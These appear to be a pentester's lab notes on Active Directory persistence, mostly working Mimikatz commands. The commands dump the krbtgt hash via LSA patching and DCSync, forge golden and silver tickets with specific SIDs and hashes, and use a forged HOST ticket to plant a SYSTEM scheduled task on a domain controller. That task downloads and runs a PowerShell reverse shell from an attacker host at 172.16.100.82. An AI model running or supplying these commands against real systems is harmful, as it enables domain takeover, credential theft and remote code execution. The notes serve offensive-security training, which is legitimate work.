# Persistance

DC only validates when TGT's lifetime is more than 20 minutes. so we can even use deleted accounts\
KDC only checks the TGT

## Kerberos

## Golden Ticket

It has a very long lifetime like 10 years\
encrypted by the hash of krbtgt account\
First create a token on behalf of domain admin

## Execute mimikatz on DC as DA to get krbtgt hash

```
klist purge // to delete all tickets
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc
```

To use the DCSync feature for getting krbtgt hash execute the below&#x20;command with DA privileges:


```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC.

## On any machine to get a golden ticket

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"' 
```

## Silver Ticket

Has a very short lifetime and gives access to the services given by the service account\
encrypted by the hash of service account\
silver tickets can issued for services like HOST(schedule tasks), CIFS(Shares), RPCSS, WSMAN

here service account is a machine account for ex. DCORP-DC$ (1000)

```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorpdc.dollarcorp.moneycorp.local /service:cifs /rc4:3c2392cdec22c2edb6e27381ee619849 /user:Administrator /ptt"' 
```

## Command Execution with Silver ticket

```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorpdc.dollarcorp.moneycorp.local /service:HOST /rc4:3c2392cdec22c2edb6e27381ee619849 /user:Administrator /ptt"'
```

```
add following line at the end of Invoke-PowerShellTcp.ps1 script
Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.82 -Port 443

schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.82:1337/Invoke-PowerShellTcp1.ps1''')'"

python -m SimpleHTTPServer 1337
powercat -l -v -p 443

schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"

```



